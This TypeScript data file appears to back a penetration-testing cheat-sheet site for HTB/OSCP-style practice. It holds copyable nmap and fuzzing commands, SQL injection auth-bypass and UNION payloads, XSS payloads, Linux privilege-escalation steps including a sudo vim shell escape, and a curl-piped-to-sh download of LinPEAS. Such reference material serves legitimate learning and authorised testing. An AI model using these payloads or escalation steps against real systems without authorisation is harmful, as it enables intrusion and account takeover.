// ── salsaheb.sh /tools — data ────────────────────────────────
// Add a tool = append an object to `tools`. Rebuild + deploy.
// kind: 'cmd'  → <angle> tokens render as amber placeholders
// kind: 'payload' → shown literally (for XSS/SQLi where <> is real)
// Search indexes: title, cmd, desc, tags, category, note.

export type Ref = { label: string; url: string };

export type Tool = {
  category: string;              // must match a Category.id below
  title: string;
  cmd: string;                   // the copyable command / payload
  desc?: string;
  tags?: string[];
  note?: string;
  ref?: Ref;
  kind?: 'cmd' | 'payload';      // default 'cmd'
};

export type Category = { id: string; label: string; blurb?: string };

export const categories: Category[] = [
  { id: 'nmap',  label: 'Nmap / Recon',            blurb: 'port & service discovery' },
  { id: 'fuzz',  label: 'Fuzzing / Content Discovery', blurb: 'dirs, files, vhosts, params' },
  { id: 'web',   label: 'Web Exploitation',        blurb: 'SQLi & XSS payloads' },
  { id: 'linux', label: 'Linux PrivEsc',           blurb: 'enumerate & escalate' },
];

const GTFO: Ref  = { label: 'GTFOBins ↗', url: 'https://gtfobins.github.io/' };
const HACKTRICKS: Ref = { label: 'HackTricks ↗', url: 'https://book.hacktricks.xyz/' };
const PATT: Ref  = { label: 'PayloadsAllTheThings ↗', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings' };
const PEASS: Ref = { label: 'PEASS-ng ↗', url: 'https://github.com/carlospolop/PEASS-ng' };

export const tools: Tool[] = [
  // ── Nmap ──────────────────────────────────────────────────
  {
    category: 'nmap', title: 'Quick TCP scan (top 1000)',
    cmd: 'nmap -sS -T4 --top-ports 1000 <ip>',
    desc: 'Fast SYN sweep of the 1000 most common TCP ports. First look at a box.',
    tags: ['tcp', 'syn', 'quick'],
  },
  {
    category: 'nmap', title: 'Full TCP scan (all 65535)',
    cmd: 'nmap -p- --min-rate 1000 -T4 <ip>',
    desc: 'Every TCP port at a high packet rate. Nothing hides on a weird port.',
    tags: ['tcp', 'full', 'all-ports'],
  },
  {
    category: 'nmap', title: 'Service + version + default scripts',
    cmd: 'nmap -sC -sV -p <ports> <ip>',
    desc: 'Version detection and default NSE scripts on the ports you already found.',
    tags: ['version', 'scripts', 'sCV'],
  },
  {
    category: 'nmap', title: 'UDP scan (top 100)',
    cmd: 'nmap -sU --top-ports 100 <ip>',
    desc: 'Common UDP services (SNMP, DNS, TFTP…). Slow — run alongside the TCP scan.',
    tags: ['udp'],
  },
  {
    category: 'nmap', title: 'Aggressive (OS + traceroute)',
    cmd: 'nmap -A -T4 <ip>',
    desc: 'OS detection, version, default scripts, and traceroute in one shot. Loud.',
    tags: ['os', 'aggressive'],
  },
  {
    category: 'nmap', title: 'Vuln NSE scripts',
    cmd: 'nmap --script vuln -p <ports> <ip>',
    desc: 'Run the vulnerability-detection script category against known ports.',
    tags: ['vuln', 'nse'],
  },
  {
    category: 'nmap', title: 'Two-stage one-liner (find → deep)',
    cmd: "ports=$(nmap -p- --min-rate 1000 -T4 <ip> | grep '^[0-9]' | cut -d/ -f1 | paste -sd, -); nmap -sCV -p$ports <ip>",
    desc: 'Scan all ports fast, extract the open ones, then run -sCV only on those.',
    note: 'The classic HTB/OSCP recon workflow — fast + thorough.',
    tags: ['recipe', 'workflow', 'oscp'],
  },

  // ── Fuzzing ───────────────────────────────────────────────
  {
    category: 'fuzz', title: 'gobuster — directories',
    cmd: 'gobuster dir -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50',
    desc: 'Brute-force directories and files. -x adds extensions to each word.',
    tags: ['gobuster', 'directories', 'web'],
    ref: HACKTRICKS,
  },
  {
    category: 'fuzz', title: 'gobuster — DNS subdomains',
    cmd: 'gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt',
    desc: 'Subdomain enumeration by resolving candidate names against DNS.',
    tags: ['gobuster', 'subdomain', 'dns'],
  },
  {
    category: 'fuzz', title: 'feroxbuster — recursive',
    cmd: 'feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html',
    desc: 'Fast, recursive content discovery — auto-digs into folders it finds.',
    tags: ['feroxbuster', 'recursive', 'web'],
  },
  {
    category: 'fuzz', title: 'ffuf — directories/files',
    cmd: 'ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.txt,.html',
    desc: 'FUZZ marks the injection point. -e appends extensions.',
    tags: ['ffuf', 'directories', 'web'],
  },
  {
    category: 'fuzz', title: 'ffuf — vhost / subdomain',
    cmd: 'ffuf -u http://<domain>/ -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs <baseline-size>',
    desc: 'Brute-force virtual hosts via the Host header.',
    note: 'Get <baseline-size> from a bogus Host first, then -fs it to filter noise.',
    tags: ['ffuf', 'vhost', 'subdomain'],
  },
  {
    category: 'fuzz', title: 'ffuf — GET parameters',
    cmd: "ffuf -u 'http://<ip>/index.php?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size>",
    desc: 'Discover hidden GET parameters. Filter the default response size with -fs.',
    tags: ['ffuf', 'parameters', 'web'],
  },

  // ── Web Exploitation ──────────────────────────────────────
  {
    category: 'web', title: 'SQLi — login auth bypass',
    cmd: "' OR '1'='1'-- -", kind: 'payload',
    desc: 'Classic boolean bypass for a quoted string field. Makes WHERE always true.',
    tags: ['sqli', 'auth-bypass'],
    ref: PATT,
  },
  {
    category: 'web', title: 'SQLi — comment out password',
    cmd: "admin'-- -", kind: 'payload',
    desc: 'Log in as a known user by commenting out the rest of the query.',
    tags: ['sqli', 'auth-bypass'],
  },
  {
    category: 'web', title: 'SQLi — find column count',
    cmd: "' ORDER BY 1-- -", kind: 'payload',
    desc: 'Increment the number until it errors — that many columns for UNION.',
    tags: ['sqli', 'union', 'enum'],
  },
  {
    category: 'web', title: 'SQLi — UNION extract',
    cmd: "' UNION SELECT NULL,NULL,NULL-- -", kind: 'payload',
    desc: 'Match the column count, then swap NULLs for @@version, user(), data.',
    tags: ['sqli', 'union'],
  },
  {
    category: 'web', title: 'sqlmap — dump databases',
    cmd: "sqlmap -u 'http://<ip>/page.php?id=1' --batch --dbs",
    desc: 'Automate injection detection and list databases. Add --dump to exfil.',
    tags: ['sqlmap', 'automation'],
    ref: HACKTRICKS,
  },
  {
    category: 'web', title: 'XSS — basic script',
    cmd: '<script>alert(document.domain)</script>', kind: 'payload',
    desc: 'Proof-of-concept for reflected or stored XSS.',
    tags: ['xss'],
    ref: PATT,
  },
  {
    category: 'web', title: 'XSS — img onerror',
    cmd: '<img src=x onerror=alert(1)>', kind: 'payload',
    desc: 'Fires when the broken image fails to load. Works where <script> is filtered.',
    tags: ['xss', 'no-script'],
  },
  {
    category: 'web', title: 'XSS — svg onload',
    cmd: '<svg onload=alert(1)>', kind: 'payload',
    desc: 'Event handler without a script tag — bypasses many naive filters.',
    tags: ['xss'],
  },
  {
    category: 'web', title: 'XSS — attribute breakout',
    cmd: '"><svg onload=alert(1)>', kind: 'payload',
    desc: 'Close the current attribute/tag first when injected inside one.',
    tags: ['xss', 'breakout'],
  },

  // ── Linux PrivEsc ─────────────────────────────────────────
  {
    category: 'linux', title: 'Situational awareness',
    cmd: 'id; sudo -l; uname -a; cat /etc/os-release',
    desc: 'Who am I, what can I run as root, kernel and distro. Always start here.',
    tags: ['enum'],
  },
  {
    category: 'linux', title: 'SUID binaries',
    cmd: 'find / -perm -4000 -type f 2>/dev/null',
    desc: 'Root-owned SUID binaries. Cross-check each against GTFOBins for an escape.',
    tags: ['suid', 'enum'],
    ref: GTFO,
  },
  {
    category: 'linux', title: 'File capabilities',
    cmd: 'getcap -r / 2>/dev/null',
    desc: 'Binaries with capabilities like cap_setuid — often a direct root path.',
    tags: ['capabilities'],
    ref: GTFO,
  },
  {
    category: 'linux', title: 'Cron jobs',
    cmd: 'cat /etc/crontab; ls -la /etc/cron.*',
    desc: 'Scheduled tasks. A writable script run by root = privesc.',
    tags: ['cron'],
  },
  {
    category: 'linux', title: 'Writable directories',
    cmd: 'find / -writable -type d 2>/dev/null',
    desc: 'Where you can drop payloads, hijack PATH, or plant a cron/service file.',
    tags: ['enum', 'writable'],
  },
  {
    category: 'linux', title: 'sudo -l → GTFOBins',
    cmd: 'sudo -l',
    desc: 'List allowed sudo commands. If any binary is permitted, GTFOBins has the escape.',
    note: 'e.g. (ALL) NOPASSWD: /usr/bin/vim  →  sudo vim -c ":!/bin/sh"',
    tags: ['sudo', 'enum'],
    ref: GTFO,
  },
  {
    category: 'linux', title: 'LinPEAS (automated)',
    cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
    desc: 'Automated privesc enumeration — highlights the fast wins in colour.',
    tags: ['linpeas', 'automation'],
    ref: PEASS,
  },
  {
    category: 'linux', title: 'Kernel exploit search',
    cmd: 'searchsploit linux kernel $(uname -r)',
    desc: 'Find public exploits for the exact running kernel version.',
    note: 'Verify the exploit before running it on exam boxes — kernel exploits can crash the target.',
    tags: ['kernel', 'searchsploit'],
  },
];
